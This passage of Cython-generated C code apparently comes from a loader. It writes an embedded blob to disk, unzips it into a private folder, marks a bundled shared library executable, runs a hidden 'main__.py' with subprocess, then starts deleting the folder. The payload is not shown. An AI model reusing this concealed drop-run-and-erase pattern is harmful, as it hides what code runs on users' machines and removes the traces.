  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_exists); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = ((!__pyx_t_4) != 0);
  if (__pyx_t_5) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 39, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 39, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_join); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
  __Pyx_INCREF(__pyx_n_u_CanYou);
  __Pyx_GIVEREF(__pyx_n_u_CanYou);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_CanYou);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_1, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Mahos, __pyx_t_3) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Mahos); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
    __Pyx_INCREF(__pyx_n_u_wb);
    __Pyx_GIVEREF(__pyx_n_u_wb);
    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_wb);
    __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L4_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L4_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_1) < 0) __PYX_ERR(0, 42, __pyx_L8_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_f); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L8_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 43, __pyx_L8_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Dev); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L8_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L8_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L13_try_end;
        __pyx_L8_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 42, __pyx_L10_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_10 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 42, __pyx_L10_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_10, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 42, __pyx_L10_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (__pyx_t_5 < 0) __PYX_ERR(0, 42, __pyx_L10_except_error)
          __pyx_t_4 = ((!(__pyx_t_5 != 0)) != 0);
          if (__pyx_t_4) {
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_3);
            __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_1, __pyx_t_3);
            __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_3 = 0; 
            __PYX_ERR(0, 42, __pyx_L10_except_error)
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          goto __pyx_L9_exception_handled;
        }
        __pyx_L10_except_error:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L1_error;
        __pyx_L9_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        __pyx_L13_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__8, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 42, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        goto __pyx_L7;
      }
      __pyx_L7:;
    }
    goto __pyx_L17;
    __pyx_L4_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L17:;
  }

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_zipfile); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_ZipFile); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Mahos); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);
    __Pyx_INCREF(__pyx_n_u_r);
    __Pyx_GIVEREF(__pyx_n_u_r);
    PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_n_u_r);
    __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_2 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L18_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L18_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __pyx_t_1;
    __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_8, &__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_7);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_zip_ref, __pyx_t_2) < 0) __PYX_ERR(0, 45, __pyx_L22_error)
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_zip_ref); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L22_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_extractall); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 46, __pyx_L22_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L22_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 46, __pyx_L22_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        goto __pyx_L27_try_end;
        __pyx_L22_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 45, __pyx_L24_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_10 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 45, __pyx_L24_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_10, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 45, __pyx_L24_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (__pyx_t_4 < 0) __PYX_ERR(0, 45, __pyx_L24_except_error)
          __pyx_t_5 = ((!(__pyx_t_4 != 0)) != 0);
          if (__pyx_t_5) {
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_XGIVEREF(__pyx_t_3);
            __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_2, __pyx_t_3);
            __pyx_t_1 = 0; __pyx_t_2 = 0; __pyx_t_3 = 0; 
            __PYX_ERR(0, 45, __pyx_L24_except_error)
          }
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          goto __pyx_L23_exception_handled;
        }
        __pyx_L24_except_error:;
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_8, __pyx_t_7);
        goto __pyx_L1_error;
        __pyx_L23_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_8, __pyx_t_7);
        __pyx_L27_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__8, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 45, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        goto __pyx_L21;
      }
      __pyx_L21:;
    }
    goto __pyx_L31;
    __pyx_L18_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L31:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_join); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_Pyahmed_so);
  __Pyx_GIVEREF(__pyx_kp_u_Pyahmed_so);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_Pyahmed_so);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pyahmed_path, __pyx_t_2) < 0) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_chmod); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_pyahmed_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2);
  __Pyx_INCREF(__pyx_int_493);
  __Pyx_GIVEREF(__pyx_int_493);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_int_493);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_join); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
  __Pyx_INCREF(__pyx_kp_u_main___py);
  __Pyx_GIVEREF(__pyx_kp_u_main___py);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_main___py);
  __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_1, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Do_Not, __pyx_t_3) < 0) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_8);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_run); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Do_Not); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_n_u_python);
      __Pyx_GIVEREF(__pyx_n_u_python);
      PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_u_python);
      __Pyx_GIVEREF(__pyx_t_3);
      PyList_SET_ITEM(__pyx_t_2, 1, __pyx_t_3);
      __pyx_t_3 = 0;
      __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2);
      __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_check, Py_True) < 0) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_10);
      if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_cwd, __pyx_t_10) < 0) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 53, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_shutil); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 54, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_rmtree); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 54, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 54, __pyx_L32_error)
